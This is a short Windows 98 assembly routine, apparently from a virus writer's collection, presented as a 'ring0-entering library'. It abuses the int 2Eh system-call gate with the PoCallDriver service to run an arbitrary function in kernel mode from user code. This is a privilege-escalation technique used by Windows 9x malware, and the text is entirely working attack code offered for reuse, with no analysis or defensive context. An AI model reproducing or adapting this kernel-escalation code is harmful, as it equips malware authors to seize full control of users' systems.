   ; ring0-entering library for win98
   ; (x) 2000 Z0MBiE, http://z0mbie.cjb.net

   callring0:              pusha
                           call    @@X
                           pusha
                           call    dword ptr [ecx]
                           popa
                           ret     8
   @@X:                    sub     esp, 14h
                           xor     eax, eax
                           push    eax
                           lea     edx, [esp+24h]
                           push    edx
                           sub     esp, 54h
                           lea     edx, [esp-38h+1Ch+54h]
                           push    edx
                           push    edx
                           pusho   ring0
                           mov     edx, esp
                           push    edx
                           push    edx
                           mov     edx, esp
                           mov     al, 8Ah         ; PoCallDriver
                           int     2Eh
                           popa
                           add     esp, 88h-20h
                           popa
                           ret
